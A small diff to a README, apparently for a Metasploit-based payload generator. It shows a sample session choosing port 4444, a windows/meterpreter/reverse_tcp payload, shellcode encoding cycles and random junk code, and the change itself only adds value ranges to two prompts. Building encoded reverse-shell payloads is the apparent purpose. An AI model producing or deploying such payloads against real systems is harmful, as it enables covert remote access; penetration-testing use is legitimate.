@@ -64,9 +64,9 @@ To install Metasploit Framework just run this command:
     > 4444
     We will be using the windows/meterpreter/reverse_X payloads. Which would you like to use?
     > windows/meterpreter/reverse_tcp
-    How many cycles we encode our shellcode?
+    How many cycles we encode our shellcode? (1-20)
     > 1
-    Number of random seed to add some junk to the resulting C code source file:
+    Number of random seed to add some junk to the resulting C code source file (1-10000):
     > 1
     
     Attempting to clean the ShellCode directory out...
